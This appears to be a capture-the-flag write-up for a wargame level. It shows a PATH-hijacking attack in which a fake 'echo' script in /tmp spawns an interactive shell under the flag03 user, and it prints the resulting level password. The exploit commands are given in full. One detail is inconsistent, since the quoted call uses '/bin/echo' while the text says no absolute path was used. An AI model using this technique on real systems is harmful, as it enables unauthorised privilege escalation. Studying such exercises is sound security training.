# Level03 Writeup

## Objective
Gain access to the `flag03` user and retrieve the password for `level04`.

## Steps Taken

1. **Binary Analysis**  
   Upon logging in as `flag03`, I discovered that I could execute a binary that internally called:
   ```bash
   /bin/echo exploit me
   ```
   I analyzed this binary using an online disassembler at [Dogbolt.org](https://dogbolt.org/) and confirmed that the program was making a direct system call to `echo`.

2. **Environment Vulnerability**  
   I realized that the program did not use an absolute path to `echo`, meaning it was relying on the `PATH` environment variable. This opened the door for a classic **PATH hijacking** attack.

3. **Create a Malicious Echo Script**  
   I created a fake `echo` script in `/tmp`:
   ```bash
   cat > /tmp/echo <<'EOF'
   #!/bin/sh
   /bin/sh -i
   EOF
   chmod +x /tmp/echo
   ```

4. **Exploit the Binary**  
   I then modified the `PATH` to ensure `/tmp` was searched before `/bin`:
   ```bash
   export PATH="/tmp:$PATH"
   ```
   Finally, I ran the vulnerable binary again. Since it called `echo`, and I had placed a malicious version of `echo` in `/tmp`, it executed **my** script instead.

5. **Shell Access**  
   The malicious `echo` spawned an interactive shell under the `flag03` user.

6. **Retrieve the Flag**  
   Once I had a shell, I ran:
   ```bash
   getflag
   ```
   This printed the flag (password for the next level):
   ```
   0efd3b7caa7cbd2584913a536b1da494
   ```

## Result
Successfully retrieved the password for `level04`:  
```
0efd3b7caa7cbd2584913a536b1da494
```
